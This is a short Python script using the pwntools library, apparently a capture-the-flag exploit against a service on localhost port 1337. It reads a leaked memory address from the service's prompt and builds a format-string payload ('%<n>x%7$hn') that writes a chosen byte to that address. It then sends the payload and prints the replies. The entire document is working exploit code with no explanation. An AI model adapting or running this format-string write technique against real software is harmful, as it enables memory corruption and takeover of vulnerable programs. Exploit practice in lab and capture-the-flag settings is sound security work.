from pwn import *

host, port = 'localhost', 1337
p = remote(host, port)

s = p.recvuntil(b'Name : ').decode()
addr = s.split('\n')[0].split(':')[1].strip()
print(f'Leak: {addr}')

padd = 2
value = 0x100 - padd - 4
payload = b'a'*padd + p32(int(addr, 16)-1) + b'%' + f'{value}'.encode() + b'x%7$hn'
print(payload)

p.sendline(payload)
print(p.recvline())
print(p.recvline())
print(p.recvline())
